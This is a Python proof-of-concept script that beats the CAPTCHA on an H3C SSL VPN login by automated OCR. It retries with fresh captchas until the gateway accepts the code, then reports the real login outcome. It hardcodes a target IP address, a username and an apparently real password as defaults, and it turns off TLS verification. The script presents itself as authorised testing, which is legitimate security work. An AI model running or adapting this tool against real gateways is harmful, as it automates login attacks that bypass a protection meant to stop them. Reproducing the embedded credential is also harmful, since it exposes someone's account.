#!/usr/bin/env python3
"""captcha_lab.py — standalone PoC for the H3C SSL VPN CAPTCHA weakness.

Authorised security testing only (your own gateway). Demonstrates that the
gateway's BMP validation image is defeated by automated OCR, using the login
reply as a success oracle. Pure-stdlib + the project's `h3csvpn.captcha` module
(which shells out to `tesseract`); no PIL/numpy/scipy.

Usage:
    python captcha_lab.py reliable [HOST:PORT] [USER] [PASS] [max_tries]
        Fetch -> auto-solve -> submit, retrying with a FRESH captcha until the
        gateway stops replying "Verify code error". Attempts that miss the
        captcha never reach the password check, so this passes the captcha with
        minimal real auth attempts and reveals the true credential outcome.

    python captcha_lab.py accuracy [HOST:PORT] [N]
        Fetch N captchas and report the solver's 4-char hit-rate (NO logins).

This is the "find a flaw and use it" deliverable; the same capability is wired
into the client itself (see `h3csvpn/captcha.py`, enabled with --auto-captcha).
"""
import sys
from xml.etree import ElementTree as ET

from h3csvpn import constants as C
from h3csvpn import protocol as P
from h3csvpn import captcha as cap
from h3csvpn.crypto import urlencode_body
from h3csvpn.transport import TLSConfig, tls_connect

DEF_HOSTPORT = "102.134.120.103:3000"
DEF_USER = "stephan botes"
DEF_PASS = "JD2B@yLw8%f9WM"


def _conn(hostport):
    host, _, port = hostport.partition(":")
    conn = tls_connect(host, int(port or 3000), TLSConfig(verify=False))
    r = conn.get(C.PATH_INDEX, ua=C.UA_V7)
    if r.is_redirect:
        r = conn.get(r.header("Location"), ua=C.UA_V7, cookies=True)
    gw = P.parse_gatewayinfo(r.text)
    return conn, gw


def _fetch_captcha(conn, gw):
    img = conn.get(gw.vldimg_url, ua=C.UA_V7, cookies=True,
                   headers=[("Accept", "*/*")])
    return img.body


def _login(conn, gw, user, pw, code):
    xml = P.build_login_xml(username=user, password=pw, vld_code=code)
    resp = conn.post(gw.login_url, urlencode_body(xml), ua=C.UA_V7, cookies=True)
    return P.parse_login_result(resp.text)


def reliable(hostport=DEF_HOSTPORT, user=DEF_USER, pw=DEF_PASS, max_tries=12):
    for i in range(int(max_tries)):
        conn, gw = _conn(hostport)
        code = cap.solve(_fetch_captcha(conn, gw)) or ""
        res = _login(conn, gw, user, pw, code)
        passed = "verify code" not in (res.reply_message or "").lower()
        print(f"[try {i}] ocr={code!r:8} captcha_passed={passed} "
              f"reply={res.reply_message!r}")
        if passed:
            print(f"\n[+] CAPTCHA DEFEATED automatically after {i+1} attempt(s) "
                  f"(code {code!r}).")
            print(f"[=] post-captcha result={res.result!r} success={res.is_success}")
            return
    print(f"[!] not solved within {max_tries} tries")


def accuracy(hostport=DEF_HOSTPORT, n=12):
    hits = 0
    for i in range(int(n)):
        conn, gw = _conn(hostport)
        code = cap.solve(_fetch_captcha(conn, gw)) or ""
        ok = len(code) == 4
        hits += ok
        print(f"[{i}] {code!r:8} {'4-char' if ok else 'partial'}")
    print(f"\n4-char solve rate: {hits}/{n}")


if __name__ == "__main__":
    {"reliable": reliable, "accuracy": accuracy}[sys.argv[1]](*sys.argv[2:])
